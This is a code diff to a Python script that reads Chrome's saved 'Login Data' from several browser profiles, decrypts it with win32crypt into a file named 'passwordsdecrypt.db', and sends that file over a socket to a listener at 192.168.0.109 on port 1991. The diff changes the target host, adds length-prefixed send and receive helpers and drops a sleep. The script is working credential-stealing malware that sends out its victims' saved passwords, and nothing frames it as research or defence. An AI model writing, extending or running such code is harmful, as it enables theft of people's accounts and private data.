@@ -9,9 +9,11 @@ from os import remove
 import sqlite3
 import win32crypt
 import socket
-import time 
+import time
+import struct
 
-HOST = '192.168.0.104'
+
+HOST = '192.168.0.109'
 PORT = 1991
 
 default_user = r'\..\Local\Google\Chrome\User Data\Default\Login Data'
@@ -19,6 +21,34 @@ profile1_user = r'\..\Local\Google\Chrome\User Data\Profile 1\Login Data'
 profile2_user = r'\..\Local\Google\Chrome\User Data\Profile 2\Login Data'
 
 passfilename = "passwordsdecrypt.db"
+
+
+def send_msg(sock, msg):
+    # Prefix each message with a 4-byte length (network byte order)
+    msg = struct.pack('>I', len(msg)) + msg
+    sock.sendall(msg)
+
+
+def recv_msg(sock):
+    # Read message length and unpack it into an integer
+    raw_msglen = recvall(sock, 4)
+    if not raw_msglen:
+        return None
+    msglen = struct.unpack('>I', raw_msglen)[0]
+    # Read the message data
+    return recvall(sock, msglen)
+
+
+def recvall(sock, n):
+    # Helper function to recv n bytes or return None if EOF is hit
+    data = b''
+    while len(data) < n:
+        packet = sock.recv(n - len(data))
+        if not packet:
+            return None
+        data += packet
+    return data
+
 
 # Open and decrypt login data
 try:
@@ -57,11 +87,9 @@ try:
         with open(passfilename, 'rb') as passfile:
             binary_data = passfile.read()
         if binary_data:
-            s.sendall(binary_data)
-            data = s.recv(1024)
+            send_msg(s, binary_data)
+            data = recv_msg(s)
             print('Received', repr(data))
-
-        time.sleep(10)
 
         # Test local
         # if binary_data:
